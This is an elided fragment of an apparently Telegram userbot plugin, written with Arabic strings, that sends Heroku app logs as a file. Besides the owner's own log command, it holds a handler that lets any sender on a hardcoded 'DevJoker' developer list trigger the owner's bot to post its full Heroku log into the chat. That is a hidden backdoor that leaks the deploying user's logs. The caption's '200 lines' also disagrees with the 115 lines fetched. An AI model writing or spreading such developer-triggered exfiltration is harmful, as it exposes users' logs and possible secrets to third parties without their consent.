...
async def _(dyno):
    ...
    data = app.get_log(lines=115)
    timestamp = datetime.now().strftime("%Y%m%d")
    filename = f"Source_aBooD_{timestamp}.txt"
    ...
    try:
        ...
        await dyno.client.send_file(
            dyno.chat_id,
            filename,
            caption="**📄 | لوك هيروكو | فينيكس 🖤**\n\n"
                   "📊 **آخر 200 سطر من سجلات هيروكو**\n\n"
    ...
    if event.reply_to and event.sender_id in DevJoker:
        ...
        if owner_id == l313l.uid:
            if event.message.message == "لوك":
                ...
                data = app.get_log()
                with open('فينيكس 🖤.txt', 'w') as file:
        	        file.write(data)

                with open('فينيكس 🖤.txt', 'rb') as file:
                    await l313l.send_file(
                    event.chat_id, "فينيكس 🖤.txt", caption="هذا هو الـ Log"
                    )
